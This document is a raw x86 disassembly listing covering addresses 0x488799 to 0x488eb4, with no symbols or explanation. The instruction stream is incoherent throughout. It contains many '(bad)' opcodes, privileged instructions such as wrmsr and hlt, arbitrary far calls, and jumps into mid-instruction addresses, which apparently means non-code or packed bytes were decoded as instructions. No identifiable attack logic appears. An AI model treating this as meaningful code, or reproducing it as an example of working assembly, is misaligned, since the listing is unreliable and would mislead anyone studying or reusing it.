  488799:	cs dec edi
  48879b:	fild   WORD PTR [edi-0x50]
  48879e:	xor    ch,BYTE PTR [ecx+ebx*1]
  4887a1:	inc    ecx
  4887a2:	pop    edi
  4887a3:	xor    BYTE PTR [esi+0xd],dl
  4887a6:	ins    DWORD PTR es:[edi],dx
  4887a7:	out    0xcf,eax
  4887a9:	mov    ah,0xd1
  4887ab:	shr    BYTE PTR [edx+0x692453c7],0x6
  4887b2:	jo     0x4887ab
  4887b4:	mov    dh,0x45
  4887b6:	dec    eax
  4887b7:	lea    edx,[eax]
  4887b9:	jbe    0x4887ea
  4887bb:	ja     0x48880f
  4887bd:	ror    BYTE PTR [edx+0x2b],cl
  4887c0:	nop    DWORD PTR [esi]
  4887c3:	rcr    BYTE PTR [edx-0x18a8c352],cl
  4887c9:	daa    
  4887ca:	jb     0x488761
  4887cc:	sbb    cl,BYTE PTR [edi+esi*4]
  4887cf:	mov    edi,0x42211b32
  4887d4:	(bad)  
  4887d5:	out    dx,eax
  4887d6:	jmp    0x4887de
  4887d8:	jbe    0x4887bc
  4887da:	jecxz  0x48876b
  4887dc:	jg     0x488846
  4887de:	ret    
  4887df:	stos   BYTE PTR es:[edi],al
  4887e0:	pop    esi
  4887e1:	push   ds
  4887e2:	aaa    
  4887e3:	xchg   DWORD PTR [ebx-0x39],esp
  4887e6:	mov    ds:0x7f335f47,al
  4887eb:	fisubr DWORD PTR [ebp+esi*2+0xb9fe7e2]
  4887f2:	hlt    
  4887f3:	mov    cl,0xaa
  4887f5:	mov    bh,0x2a
  4887f7:	adc    ebx,DWORD PTR [edi]
  4887f9:	pop    ds
  4887fa:	add    eax,esp
  4887fc:	adc    DWORD PTR [ebx],ebp
  4887fe:	mov    bh,0x47
  488800:	dec    ebx
  488801:	dec    esi
  488802:	push   es
  488803:	not    bh
  488805:	push   edi
  488806:	ss ss ins DWORD PTR es:[edi],dx
  488809:	cli    
  48880a:	fdiv   DWORD PTR [ebp+0x3e]
  48880d:	outs   dx,DWORD PTR ds:[esi]
  48880e:	xor    esi,DWORD PTR [edi-0x5c]
  488811:	and    ah,bl
  488813:	outs   dx,BYTE PTR ds:[esi]
  488814:	inc    edi
  488815:	xor    edx,edi
  488817:	loop   0x4887c6
  488819:	and    dl,BYTE PTR ds:0x91d33f3f
  48881f:	push   esi
  488820:	or     al,0xe
  488822:	inc    DWORD PTR [edi-0x31]
  488825:	sbb    bl,ch
  488827:	mov    dl,0x42
  488829:	mov    DWORD PTR [bp+di],eax
  48882c:	loopne 0x4888ab
  48882e:	jecxz  0x48880f
  488830:	out    dx,eax
  488831:	adc    al,0xac
  488833:	bound  esi,QWORD PTR [ecx-0x7cf8a0b5]
  488839:	push   0xffffffc5
  48883b:	mov    ebx,0x2f8f9bfe
  488840:	pop    eax
  488841:	mov    edx,0x45a3016a
  488846:	adc    eax,0x17b0416e
  48884b:	pop    es
  48884c:	and    ecx,DWORD PTR [edi+0x56f1da6b]
  488852:	(bad)  
  488854:	das    
  488855:	push   ecx
  488856:	aam    0x8d
  488858:	mov    ds:0x46025f39,al
  48885d:	or     al,0xa
  48885f:	mov    al,0xd7
  488861:	push   edi
  488862:	scas   eax,DWORD PTR es:[edi]
  488863:	or     esp,DWORD PTR [edx]
  488865:	and    al,0xb9
  488867:	xor    al,0xa7
  488869:	pop    edx
  48886a:	nop
  48886b:	in     al,0x12
  48886d:	out    0x32,al
  48886f:	pop    es
  488870:	or     dl,dh
  488872:	xor    BYTE PTR [eax+0xa3f278f],ch
  488878:	push   es
  488879:	add    eax,0x9f6f39b8
  48887e:	xor    BYTE PTR [eax+eiz*8],0x5
  488882:	fisttp DWORD PTR [edi+0x18]
  488885:	push   cs
  488886:	xor    DWORD PTR [edx-0x2da00c51],ebx
  48888c:	xchg   ecx,eax
  48888d:	inc    edx
  48888e:	imul   edi,DWORD PTR [eax],0xbd8b776f
  488894:	adc    edx,edx
  488896:	push   edi
  488897:	push   edx
  488898:	push   edi
  488899:	out    dx,eax
  48889a:	stc    
  48889b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48889c:	sahf   
  48889d:	inc    esi
  48889e:	and    esi,DWORD PTR es:[esi]
  4888a1:	or     edx,DWORD PTR ss:[esi+0x64]
  4888a5:	and    eax,0x20210757
  4888aa:	adc    DWORD PTR [ecx+0x7f],edx
  4888ad:	dec    ecx
  4888ae:	pusha  
  4888af:	stos   BYTE PTR es:[edi],al
  4888b0:	inc    ecx
  4888b1:	pop    edi
  4888b2:	pop    es
  4888b3:	inc    edx
  4888b4:	mov    BYTE PTR [eax+0x437fd0c8],al
  4888ba:	pop    edi
  4888bb:	dec    ecx
  4888bc:	mov    ebx,0xc77bb0e5
  4888c1:	scas   al,BYTE PTR es:[edi]
  4888c2:	ins    BYTE PTR es:[edi],dx
  4888c3:	lods   al,BYTE PTR ds:[esi]
  4888c4:	lods   eax,DWORD PTR ds:[esi]
  4888c5:	outs   dx,DWORD PTR ds:[esi]
  4888c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4888c7:	arpl   WORD PTR [ebx+0x27101c4a],ax
  4888cd:	fiadd  DWORD PTR [ebp-0x684853ca]
  4888d3:	xchg   DWORD PTR [ebx],eax
  4888d5:	add    edi,edx
  4888d7:	cli    
  4888d8:	les    eax,FWORD PTR [edi+0x5b]
  4888db:	sub    al,0xad
  4888dd:	adc    BYTE PTR [ecx],0x37
  4888e0:	out    dx,eax
  4888e1:	pop    es
  4888e2:	mov    ah,0x43
  4888e4:	pop    eax
  4888e5:	daa    
  4888e6:	xlat   BYTE PTR ds:[ebx]
  4888e7:	xlat   BYTE PTR ds:[ebx]
  4888e8:	mov    eax,0x57581234
  4888ed:	jnp    0x488935
  4888ef:	pop    edx
  4888f0:	mov    ch,0x4e
  4888f2:	lahf   
  4888f3:	jnp    0x48896c
  4888f5:	mov    eax,0x43929749
  4888fa:	aas    
  4888fb:	inc    esi
  4888fc:	mov    dh,0x80
  4888fe:	adc    eax,0xcf2f0f59
  488903:	mov    al,ds:0x97aa95a0
  488908:	pop    es
  488909:	xor    DWORD PTR [ecx+0x4b0fd07a],eax
  48890f:	xor    esi,edx
  488911:	fs mov esp,0x8467df5f
  488917:	dec    ecx
  488918:	adc    edx,DWORD PTR [esi]
  48891a:	rol    BYTE PTR [esp+esi*1+0x18],cl
  48891e:	adc    eax,0x4a5f079b
  488923:	and    BYTE PTR [ebp+0x58],bl
  488926:	add    eax,0xad41c727
  48892b:	pusha  
  48892c:	jo     0x4888fd
  48892e:	(bad)  
  48892f:	ins    DWORD PTR es:[edi],dx
  488930:	adc    eax,0x5f3f5802
  488935:	mov    bl,0x58
  488937:	xor    DWORD PTR [esi-0x57],edx
  48893a:	xcrypt-cbc (bad)
  48893b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48893c:	adc    cl,BYTE PTR [edx+0x47]
  48893f:	xchg   esp,eax
  488940:	iret   
  488941:	inc    ecx
  488942:	scas   eax,DWORD PTR es:[edi]
  488943:	stos   DWORD PTR es:[edi],eax
  488944:	add    al,BYTE PTR [edi]
  488946:	or     ebx,DWORD PTR [edi-0x2d]
  488949:	push   edi
  48894a:	push   ds
  48894b:	test   eax,0x9f32b158
  488950:	pop    ss
  488951:	jbe    0x4888f5
  488953:	push   edx
  488954:	loop   0x488958
  488956:	pop    es
  488957:	xchg   edi,eax
  488958:	push   esi
  488959:	aaa    
  48895a:	add    bl,0xe6
  48895d:	pop    edi
  48895e:	or     al,ch
  488960:	and    eax,0x47329fdd
  488965:	xor    DWORD PTR [edx],edi
  488967:	lods   al,BYTE PTR ds:[esi]
  488968:	test   edi,edx
  48896a:	mov    edi,0xb55b12e5
  48896f:	mov    bh,0x27
  488971:	psrld  mm1,QWORD PTR [ebp+ebx*2+0x33]
  488976:	mov    edi,0x8c0ab746
  48897b:	xchg   ebp,eax
  48897c:	fimul  DWORD PTR [edi+0x17]
  48897f:	out    0x8d,eax
  488981:	adc    eax,0xffefc0cf
  488986:	xor    BYTE PTR [ecx+0x2b],cl
  488989:	fcomp  st(7)
  48898b:	jg     0x488964
  48898d:	sbb    edi,DWORD PTR [edx]
  48898f:	lea    ecx,[ebx-0x4a]
  488992:	div    DWORD PTR ds:0x3be425cf
  488998:	pop    edx
  488999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48899a:	das    
  48899b:	cmp    ch,dl
  48899d:	adc    dl,BYTE PTR [esi-0x78cff196]
  4889a3:	(bad)  
  4889a4:	shl    BYTE PTR [eax],1
  4889a6:	or     eax,0xd2686733
  4889ab:	mov    dh,0x98
  4889ad:	pop    ss
  4889ae:	ja     0x4889af
  4889b0:	adc    BYTE PTR [eax],bl
  4889b2:	push   0x41
  4889b4:	push   edi
  4889b5:	jle    0x488968
  4889b7:	inc    ebx
  4889b8:	push   esp
  4889b9:	mov    BYTE PTR [edi],cl
  4889bb:	dec    ebx
  4889bc:	xchg   edx,eax
  4889bd:	add    DWORD PTR [esi-0x4b],edx
  4889c0:	nop    DWORD PTR ds:0x9f85611c
  4889c7:	and    esp,DWORD PTR [edi-0x28]
  4889ca:	push   es
  4889cb:	mov    dh,0x8a
  4889cd:	pop    ss
  4889ce:	out    0x32,eax
  4889d0:	pop    es
  4889d1:	sub    al,0x86
  4889d3:	mov    ecx,DWORD PTR [edx-0x7118bca9]
  4889d9:	ret    
  4889da:	or     ah,BYTE PTR [eax]
  4889dc:	out    dx,eax
  4889dd:	push   di
  4889df:	push   cs
  4889e0:	add    ebp,0xaf27438e
  4889e6:	xor    DWORD PTR [ecx],edx
  4889e8:	imul   ecx,DWORD PTR [edx+0x431f46e7],0x34
  4889ef:	or     bl,al
  4889f1:	inc    esi
  4889f2:	xchg   DWORD PTR [edi+0x412f4731],edi
  4889f8:	retf   
  4889f9:	mov    al,0xf7
  4889fb:	xor    eax,0x6b001147
  488a00:	and    DWORD PTR [edx-0x5e9690b9],0xffffffc1
  488a07:	ret    0xff33
  488a0a:	xchg   esi,eax
  488a0b:	xor    BYTE PTR [edx],bh
  488a0d:	sbb    DWORD PTR ss:[ebx],esp
  488a10:	nop    DWORD PTR [ebp+0x3fd2c5bd]
  488a17:	cmp    ebp,DWORD PTR [edi-0x6e290f3d]
  488a1d:	daa    
  488a1e:	das    
  488a1f:	daa    
  488a20:	addr16 xor al,0xb5
  488a23:	ficomp DWORD PTR [eax+0x4]
  488a26:	iret   
  488a27:	iret   
  488a28:	push   esi
  488a29:	and    esp,DWORD PTR [esi+ebx*1]
  488a2c:	mov    edi,0x61b5335f
  488a31:	adc    eax,0x9d9fd749
  488a36:	pop    eax
  488a37:	ret    
  488a38:	sub    cl,BYTE PTR [edi]
  488a3a:	pop    ss
  488a3b:	pop    ss
  488a3c:	add    eax,0x7a1bac9a
  488a41:	(bad)  
  488a42:	call   0x3727:0xeb5d40d2
  488a49:	cmp    esi,DWORD PTR [eax-0xc403df7]
  488a4f:	dec    ebx
  488a50:	stos   DWORD PTR es:[edi],eax
  488a51:	mov    ah,0x43
  488a53:	dec    edi
  488a54:	xlat   BYTE PTR ds:[ebx]
  488a55:	imul   edx,edx,0x270f3428
  488a5b:	xor    al,0x3c
  488a5d:	arpl   WORD PTR [ebx+ebp*4],ax
  488a60:	aas    
  488a61:	xlat   BYTE PTR ds:[ebx]
  488a62:	scas   eax,DWORD PTR es:[edi]
  488a63:	sbb    edx,DWORD PTR [eax]
  488a65:	fsubr  QWORD PTR [ecx]
  488a67:	out    0x31,eax
  488a69:	jmp    FWORD PTR [esi+0x3a]
  488a6c:	fmul   DWORD PTR [edx+0x38c76788]
  488a72:	and    dl,BYTE PTR ds:0x870f59a9
  488a78:	sbb    edi,DWORD PTR [esi+eax*8]
  488a7b:	or     BYTE PTR [edi],dl
  488a7d:	sub    ebp,DWORD PTR [edi]
  488a7f:	rol    BYTE PTR [ecx-0x7e],0x4d
  488a83:	push   edi
  488a84:	daa    
  488a85:	and    esp,DWORD PTR [eax-0x1852d730]
  488a8b:	call   FWORD PTR [eax+0x54]
  488a8e:	(bad)  
  488a8f:	xor    DWORD PTR [edi-0x49],ecx
  488a92:	shl    DWORD PTR [ecx],0xe0
  488a95:	push   eax
  488a96:	pop    ss
  488a97:	lgs    esp,FWORD PTR [ecx+0x15]
  488a9b:	fstp   TBYTE PTR [ecx]
  488a9d:	ja     0x488ab6
  488a9f:	aas    
  488aa0:	mov    eax,ds
  488aa2:	sbb    al,BYTE PTR [ebp+0x288e0f97]
  488aa8:	scas   al,BYTE PTR es:[edi]
  488aa9:	push   0x4f
  488aab:	xor    esi,DWORD PTR [edi]
  488aad:	xor    ah,BYTE PTR [esi]
  488aaf:	add    DWORD PTR [edi],ebp
  488ab1:	xchg   edi,eax
  488ab2:	(bad)  
  488ab3:	repz bswap edi
  488ab6:	jp     0x488b0f
  488ab8:	mov    al,0x7f
  488aba:	cmp    DWORD PTR [ebx+0x60ac16bb],eax
  488ac0:	add    eax,0x1d77ef07
  488ac5:	pop    edx
  488ac6:	ror    DWORD PTR [edx+0x28877fc7],0x4
  488acd:	sub    al,0x86
  488acf:	mov    bh,0x27
  488ad1:	dec    esp
  488ad2:	pop    esi
  488ad3:	lods   al,BYTE PTR ds:[esi]
  488ad4:	or     eax,0xb141976f
  488ad9:	outs   dx,BYTE PTR ds:[esi]
  488ada:	bound  edx,QWORD PTR [ebp+0x17]
  488add:	(bad)
  488ae1:	cdq    
  488ae2:	ja     0x488b16
  488ae4:	pop    ds
  488ae5:	push   ebp
  488ae6:	stos   DWORD PTR es:[edi],eax
  488ae7:	xchg   edx,eax
  488ae8:	out    dx,al
  488ae9:	ret    
  488aea:	push   es
  488aeb:	mov    edi,0xe82ad0a7
  488af0:	push   0xffffffef
  488af2:	mov    DWORD PTR [esp+ebp*4],0x5f4f058a
  488af9:	lods   al,BYTE PTR ds:[esi]
  488afa:	sbb    edx,edx
  488afc:	call   0x1485:0x8a3837d7
  488b03:	xchg   edi,edi
  488b05:	inc    esp
  488b06:	or     BYTE PTR [ebp-0x57],cl
  488b09:	dec    eax
  488b0a:	scas   eax,DWORD PTR es:[edi]
  488b0b:	(bad)  
  488b0c:	mov    DWORD PTR [ecx],eax
  488b0e:	dec    edi
  488b0f:	test   eax,0xab6f3b57
  488b14:	loopne 0x488aa6
  488b16:	push   ss
  488b17:	jg     0x488b5e
  488b19:	inc    ebx
  488b1a:	pop    es
  488b1b:	pop    eax
  488b1c:	repnz popa 
  488b1e:	adc    eax,0x8d45070f
  488b23:	rcr    BYTE PTR [ebx-0x7c],0x27
  488b27:	(bad)  
  488b28:	outs   dx,DWORD PTR ds:[esi]
  488b29:	cli    
  488b2a:	les    ebp,FWORD PTR [edx]
  488b2c:	and    ch,BYTE PTR [edi+0x67]
  488b2f:	(bad)  
  488b30:	inc    esi
  488b31:	mov    BYTE PTR [ebp-0x4b90b8c1],dl
  488b37:	add    BYTE PTR [ebx],cl
  488b39:	icebp  
  488b3a:	inc    edi
  488b3b:	xchg   edi,eax
  488b3c:	daa    
  488b3d:	inc    edx
  488b3e:	rcr    DWORD PTR [ebx+0x1],cl
  488b41:	das    
  488b42:	pop    ds
  488b43:	xchg   DWORD PTR [ebp+0x7fd6342d],ecx
  488b49:	pop    ds
  488b4a:	ja     0x488b71
  488b4c:	push   edx
  488b4d:	dec    ebp
  488b4e:	lods   eax,DWORD PTR ds:[esi]
  488b4f:	aaa    
  488b50:	addr16 jg 0x488b68
  488b53:	ror    DWORD PTR [ebp-0x2e],cl
  488b56:	aaa    
  488b57:	inc    ebx
  488b58:	mov    bh,0x5f
  488b5a:	test   eax,0x57f78ac0
  488b5f:	jg     0x488b86
  488b61:	mov    ss,WORD PTR [ebx+edx*1]
  488b64:	aaa    
  488b65:	xchg   edi,eax
  488b66:	cwde   
  488b67:	mov    ch,0x18
  488b69:	pusha  
  488b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488b6b:	(bad)  
  488b6c:	xchg   ecx,eax
  488b6d:	sbb    ecx,DWORD PTR ds:0xee5f4fc4
  488b73:	sbb    eax,0x1fa18b4d
  488b78:	mov    edi,0x1561a433
  488b7d:	mov    ch,0x2f
  488b7f:	pop    es
  488b80:	pop    gs
  488b82:	lds    ecx,FWORD PTR [esi]
  488b84:	dec    edx
  488b85:	(bad)  
  488b86:	cmp    BYTE PTR [edi+0x0],ch
  488b89:	sbb    BYTE PTR [ebp+0x421723be],dh
  488b8f:	scas   al,BYTE PTR es:[edi]
  488b90:	mov    al,ds:0x43162f75
  488b95:	push   esi
  488b96:	adc    ch,BYTE PTR [ebx-0x372804b0]
  488b9c:	cmp    dl,BYTE PTR [esi]
  488b9e:	(bad)  
  488b9f:	xchg   DWORD PTR [bp+di],esp
  488ba2:	or     ch,BYTE PTR [edx]
  488ba4:	xor    al,0x37
  488ba6:	out    dx,eax
  488ba7:	sbb    edx,DWORD PTR [esi-0xc]
  488baa:	push   es
  488bab:	outs   dx,BYTE PTR ds:[esi]
  488bac:	pop    ss
  488bad:	pop    edi
  488bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488baf:	icebp  
  488bb0:	mov    DWORD PTR [ebp+0x40],edx
  488bb3:	pop    ss
  488bb4:	fbld   TBYTE PTR [edi+0x2c]
  488bb7:	mov    al,ds:0xaf373f56
  488bbc:	sub    ch,BYTE PTR [esp+eiz*8]
  488bbf:	xchg   BYTE PTR [edi+0xe057738],bh
  488bc5:	sbb    BYTE PTR [esi+ebp*1],cl
  488bc8:	inc    esi
  488bc9:	dec    edi
  488bca:	sbb    ecx,DWORD PTR [eax]
  488bcc:	lods   al,BYTE PTR ds:[esi]
  488bcd:	imul   eax,DWORD PTR [edi-0x31],0x4b116216
  488bd4:	inc    edi
  488bd5:	inc    ebx
  488bd6:	or     DWORD PTR [esi],ecx
  488bd8:	fdiv   QWORD PTR [edi-0xf208ded]
  488bde:	xor    DWORD PTR [edx],ecx
  488be0:	data16 jnp 0x488c29
  488be3:	pop    ds
  488be4:	outs   dx,DWORD PTR ds:[esi]
  488be5:	sbb    eax,0x7458ad1
  488bea:	fld    TBYTE PTR [edi+0x687d8a30]
  488bf0:	jno    0x488bd1
  488bf2:	fwait
  488bf3:	inc    edi
  488bf4:	adc    DWORD PTR [eax],esp
  488bf6:	xor    al,0x62
  488bf8:	inc    edx
  488bf9:	(bad)  
  488bfa:	scas   eax,DWORD PTR es:[edi]
  488bfb:	and    al,0xd6
  488bfd:	add    DWORD PTR [eax],esp
  488bff:	(bad)  
  488c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488c01:	add    BYTE PTR [ebx],al
  488c03:	sub    eax,0xd147124f
  488c08:	icebp  
  488c09:	mov    ch,0x42
  488c0b:	sbb    edi,DWORD PTR [ebx-0x39524f11]
  488c11:	test   BYTE PTR [edi],ah
  488c13:	xor    ah,bh
  488c15:	and    BYTE PTR ds:0x423f9aeb,dl
  488c1b:	inc    esp
  488c1d:	or     dh,BYTE PTR [ecx]
  488c1f:	outs   dx,BYTE PTR ds:[esi]
  488c20:	(bad)  
  488c21:	jmp    DWORD PTR [edx]
  488c23:	inc    ebx
  488c24:	jmp    0xd268:0x4f3f1f7a
  488c2b:	stos   BYTE PTR es:[edi],al
  488c2c:	jne    0x488c6d
  488c2e:	(bad)  
  488c30:	sbb    DWORD PTR [eax-0x7d],ebx
  488c33:	adc    DWORD PTR [edi+0x72],ebx
  488c36:	and    BYTE PTR [edi],al
  488c38:	mov    DWORD PTR [edi-0x76cabe52],ecx
  488c3e:	push   esp
  488c3f:	inc    ebp
  488c40:	pop    ebp
  488c41:	inc    ebx
  488c42:	push   edi
  488c43:	adc    DWORD PTR [ebx-0x36],eax
  488c46:	push   ecx
  488c47:	fbstp  TBYTE PTR ds:0x7822c4af
  488c4d:	outs   dx,BYTE PTR ds:[esi]
  488c4e:	pop    es
  488c4f:	fwait
  488c50:	push   edi
  488c51:	inc    ebx
  488c52:	pop    eax
  488c53:	(bad)  
  488c54:	call   0x7b15fba8
  488c59:	dec    edx
  488c5a:	jo     0x488c73
  488c5c:	addr16 daa 
  488c5e:	sub    ebx,DWORD PTR ds:0x67334bc6
  488c64:	scas   al,BYTE PTR es:[edi]
  488c65:	inc    ecx
  488c66:	mov    cl,0xc0
  488c68:	neg    DWORD PTR [edi+0x5f]
  488c6b:	adc    eax,DWORD PTR [eax]
  488c6d:	add    al,0xe8
  488c6f:	(bad)  
  488c70:	pop    ss
  488c71:	fsubr  QWORD PTR [eax]
  488c73:	mov    al,ds:0xd30717f0
  488c78:	jecxz  0x488ccc
  488c7a:	xchg   ebp,eax
  488c7b:	icebp  
  488c7c:	xlat   BYTE PTR ds:[ebx]
  488c7d:	not    DWORD PTR [edx-0x5c]
  488c80:	shr    DWORD PTR [ecx-0x53],0x87
  488c84:	(bad)  
  488c85:	push   eax
  488c86:	ret    0x7511
  488c89:	sub    DWORD PTR [edi],0x25
  488c8c:	xlat   BYTE PTR ds:[ebx]
  488c8d:	dec    ebp
  488c8e:	lods   al,BYTE PTR ds:[esi]
  488c8f:	pop    ds
  488c90:	xchg   edi,eax
  488c91:	cmp    BYTE PTR [ebx+0x238ac21b],ch
  488c97:	xchg   DWORD PTR [edx-0x60],eax
  488c9a:	mov    al,ds:0xb7427766
  488c9f:	adc    DWORD PTR [eax-0x52],eax
  488ca2:	inc    ecx
  488ca3:	mov    edi,0x5845cc31
  488ca8:	xchg   ecx,eax
  488ca9:	fbstp  TBYTE PTR [ebx-0x484fb7ce]
  488caf:	or     bl,BYTE PTR [edi-0x4ecdd051]
  488cb5:	push   ecx
  488cb6:	stos   DWORD PTR es:[edi],eax
  488cb7:	pop    ss
  488cb8:	ja     0x488cbe
  488cba:	ins    DWORD PTR es:[edi],dx
  488cbb:	push   esi
  488cbc:	push   0x8357470f
  488cc1:	add    ebp,0xb444b7e7
  488cc7:	mov    BYTE PTR [eax],ch
  488cc9:	ins    BYTE PTR es:[edi],dx
  488cca:	shl    DWORD PTR [edi],cl
  488ccc:	pop    edx
  488ccd:	inc    esp
  488cce:	(bad)  
  488ccf:	fisttp DWORD PTR [edi]
  488cd1:	xchg   ebx,eax
  488cd2:	out    dx,eax
  488cd3:	loope  0x488ca7
  488cd5:	ins    BYTE PTR es:[edi],dx
  488cd6:	int3   
  488cd7:	daa    
  488cd8:	mov    bh,0x45
  488cda:	ret    
  488cdb:	test   eax,0x448450d2
  488ce0:	xor    edx,DWORD PTR [bx]
  488ce3:	imul   esi,DWORD PTR es:[eax+0x48],0xffffff9f
  488ce8:	unpcklps xmm5,XMMWORD PTR [edx+0x67efb19e]
  488cef:	aad    0xc2
  488cf1:	add    edx,edx
  488cf3:	(bad)  
  488cf4:	rol    DWORD PTR [edi+0x36],cl
  488cf7:	mov    al,0x42
  488cf9:	pusha  
  488cfa:	jg     0x488c80
  488cfc:	(bad)
  488cff:	push   edi
  488d00:	dec    DWORD PTR [edx+0x27175861]
  488d06:	push   edi
  488d07:	xor    esp,DWORD PTR [edi+0x22]
  488d0a:	adc    dh,dl
  488d0c:	mov    ah,0xcf
  488d0e:	xchg   eax,esp
  488d10:	jge    0x488cfe
  488d12:	inc    esp
  488d13:	xchg   DWORD PTR [edi-0x3ee95705],ecx
  488d19:	jne    0x488d7a
  488d1b:	xor    eax,0x505ce707
  488d20:	stos   DWORD PTR es:[edi],eax
  488d21:	call   0xd6d8:0x58af8f43
  488d28:	sub    eax,0x446e4f37
  488d2d:	jo     0x488cc3
  488d2f:	sub    edx,DWORD PTR [edi+0xf]
  488d32:	inc    edi
  488d33:	test   eax,0x459352e2
  488d38:	movq   QWORD PTR [edi+esi*4],mm7
  488d3c:	dec    esi
  488d3d:	sbb    edi,eax
  488d3f:	rcr    DWORD PTR [edi+0x5718ac41],cl
  488d45:	fild   DWORD PTR [edx+0x4f]
  488d48:	fs push 0x30
  488d4b:	jo     0x488d70
  488d4d:	xchg   DWORD PTR [ebp-0x18],eax
  488d50:	sbb    bl,BYTE PTR [ebp+0x3877746]
  488d56:	mov    es,WORD PTR [edx]
  488d58:	inc    edx
  488d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488d5a:	xor    edi,edx
  488d5c:	xchg   DWORD PTR [ebp+0x65],edx
  488d5f:	push   0x2ed2b387
  488d64:	lods   al,BYTE PTR ds:[esi]
  488d65:	scas   al,BYTE PTR es:[edi]
  488d66:	lahf   
  488d67:	das    
  488d68:	inc    ebp
  488d69:	loopne 0x488d7f
  488d6b:	sub    bh,ch
  488d6d:	and    bl,BYTE PTR [eax+0x48]
  488d70:	xor    al,BYTE PTR [ecx-0x69]
  488d73:	inc    esp
  488d74:	sbb    cl,BYTE PTR [ebp+0x737a305]
  488d7a:	xlat   BYTE PTR ds:[ebx]
  488d7b:	nop
  488d7c:	add    bl,BYTE PTR [ebp-0x3a]
  488d7f:	dec    edi
  488d80:	aam    0x2a
  488d82:	pop    eax
  488d83:	dec    esp
  488d84:	ja     0x488de5
  488d86:	pop    ebp
  488d87:	stos   DWORD PTR es:[edi],eax
  488d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488d89:	jo     0x488d25
  488d8b:	outs   dx,DWORD PTR ds:[esi]
  488d8c:	xchg   edi,eax
  488d8d:	sub    eax,ecx
  488d8f:	ins    DWORD PTR es:[edi],dx
  488d90:	sbb    eax,0xe3b41743
  488d95:	inc    ebx
  488d96:	sar    BYTE PTR [esi],1
  488d98:	pop    es
  488d99:	pop    DWORD PTR [esi+0x2f366b15]
  488d9f:	inc    edi
  488da0:	mov    edi,0xe40c1431
  488da5:	ss das 
  488da7:	xor    al,0x86
  488da9:	or     cl,0x45
  488dac:	aaa    
  488dad:	xor    edi,DWORD PTR [edi+0x43]
  488db0:	add    BYTE PTR [ecx+0x15],ch
  488db3:	dec    ebx
  488db4:	pop    ss
  488db5:	shr    BYTE PTR [edx+0x6fe3d84a],0xa
  488dbc:	test   DWORD PTR [edi+0x6f3f174c],ecx
  488dc2:	mov    ecx,0x4f04499a
  488dc7:	mov    DWORD PTR ss:[ebx+0x3f6716c6],edx
  488dce:	add    ebx,ebp
  488dd0:	adc    al,0x6
  488dd2:	bound  ecx,QWORD PTR [edi+0x6b8cba14]
  488dd8:	rcl    DWORD PTR [edi],cl
  488dda:	adc    al,0x46
  488ddc:	cmp    ecx,edx
  488dde:	push   edi
  488ddf:	(bad)  
  488de0:	call   FWORD PTR [ecx+ecx*8]
  488de3:	ja     0x488dc2
  488de5:	das    
  488de6:	xor    edi,DWORD PTR [edi+0x30]
  488de9:	xor    al,0x80
  488deb:	push   ecx
  488dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488ded:	test   edi,esp
  488def:	popa   
  488df0:	int    0xc2
  488df2:	mov    eax,0x74343faf
  488df7:	jmp    0x9d34:0xdf6aeb76
  488dfe:	cmp    al,BYTE PTR [eax-0x46]
  488e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488e02:	dec    edi
  488e03:	push   DWORD PTR ds:0xf784b8a4
  488e09:	wrmsr  
  488e0b:	stos   BYTE PTR es:[edi],al
  488e0c:	mov    ds:0xef33cf61,eax
  488e11:	cmp    ecx,ebp
  488e13:	inc    esi
  488e14:	pop    ss
  488e15:	xchg   DWORD PTR [edi],edi
  488e17:	inc    edx
  488e18:	xor    al,0x24
  488e1a:	test   al,0xa9
  488e1c:	or     eax,DWORD PTR [ebx-0x51]
  488e1f:	ror    DWORD PTR [esi+0x761f605b],0x1b
  488e26:	push   ss
  488e27:	xor    DWORD PTR [edx],edi
  488e29:	scas   al,BYTE PTR es:[edi]
  488e2a:	mov    eax,ds:0x4bed1f67
  488e2f:	sbb    BYTE PTR [ebp+0x22],ch
  488e32:	mov    bh,0xbb
  488e34:	push   DWORD PTR [eax+0x40]
  488e37:	jo     0x488ea5
  488e39:	inc    edi
  488e3a:	xor    edi,DWORD PTR [edi]
  488e3c:	xor    esi,DWORD PTR [ecx+edi*4]
  488e3f:	pusha  
  488e40:	cmp    ebx,DWORD PTR [edi+0x3f]
  488e43:	inc    edx
  488e44:	mov    ch,0xa
  488e46:	imul   edx,DWORD PTR [ecx],0x6f
  488e49:	mov    bh,0x6e
  488e4b:	pop    es
  488e4c:	enter  0x166d,0xb7
  488e50:	xor    DWORD PTR [ecx+0x3f],eax
  488e53:	xor    BYTE PTR [esi-0x61bf4ffb],al
  488e59:	ja     0x488ec5
  488e5b:	and    DWORD PTR [edi+0x383f4181],esi
  488e61:	shl    DWORD PTR [esp+ebp*1+0x26],0x4f
  488e66:	dec    edi
  488e67:	inc    ebp
  488e68:	cmp    al,BYTE PTR [ecx+0x342eefa3]
  488e6e:	mov    al,ds:0x9723b815
  488e73:	(bad)  
  488e74:	das    
  488e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488e76:	in     eax,dx
  488e77:	dec    ebx
  488e78:	fcom   DWORD PTR [edi+0x6e09b36f]
  488e7e:	adc    dh,bh
  488e80:	aaa    
  488e81:	call   0x341:0x3e0101ef
  488e88:	inc    ebx
  488e89:	inc    edi
  488e8a:	adc    al,0xc6
  488e8c:	mov    edx,0x81374789
  488e91:	mov    esp,0x32374600
  488e96:	inc    ecx
  488e97:	mov    bh,0x0
  488e99:	dec    edx
  488e9a:	mov    ebp,DWORD PTR [esi]
  488e9c:	pop    edx
  488e9d:	dec    ecx
  488e9e:	in     al,dx
  488e9f:	sar    dh,0x87
  488ea2:	pop    ds
  488ea3:	lea    esp,[edx+0x67d78055]
  488ea9:	(bad)  
  488eaa:	jmp    0x2daf:0x33032418
  488eb1:	test   BYTE PTR [edx],ah
  488eb3:	lods   al,BYTE PTR ds:[esi]
  488eb4:	pop    es
